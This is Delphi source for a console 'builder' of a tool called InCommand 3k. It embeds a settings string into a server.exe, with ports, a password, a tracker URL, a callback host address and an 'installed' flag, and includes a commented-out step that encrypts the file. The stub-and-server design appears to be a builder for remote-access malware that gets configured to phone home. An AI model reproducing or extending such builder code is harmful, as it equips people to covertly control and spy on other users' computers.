program builder;

{$APPTYPE CONSOLE}
{$DEFINE DBG}
{$R *.res}

uses
  Windows, Classes, System.SysUtils, ic3k_lib, file_lib, mysettings2, mycrypt;

const
 stub   = 'stub.exe';
 srvr   = 'server.exe';
 tmpexe = 'temp.exe';


var
 tmp: string;
begin
 //  mPort, hPort, sPasswd, sCFG, tracker_url, installed, start_chat, host_addr, use_tracker
 //  9400@8080@passwd@ic3k.cfg@http://kj6ywd.net/ic3k/tracker.php@1@1@192.168.1.164@1
 dprint('[builder]: InCommand 3k Builder BETA');
 dprint('[builder]: building for '+SERVERNAME+' v'+SERVERVERSION);
 setcurrentdirectory(pwidechar(extractfilepath(paramstr(0))));
 if (not fileexists(srvr)) then
 begin
  dprint('[error]: FileNotFound '+stub+' or '+srvr);
  Halt(0);
 end;

 dprint('[builder]: writing to '+srvr);
 // mPort, hPort, sPasswd, sCFG, tracker_url, installed, start_chat, host_addr

 tmp := '9400@8080@passwd@ic3k.cfg@http://kj6ywd.net/ic3k/@1@1@192.168.1.164@1';
 if savesettings(srvr,tmp) then
  begin
   dprint('[builder]: done writing');
   //myencrypt_file(srvr,tmpexe,xKEY);
  end else
  begin
   dprint('[error]: unable to write to '+srvr);
   Halt(0);
  end;
 //write_data(srvr,tmp);
 //read_data(srvr,tmp2);
end.

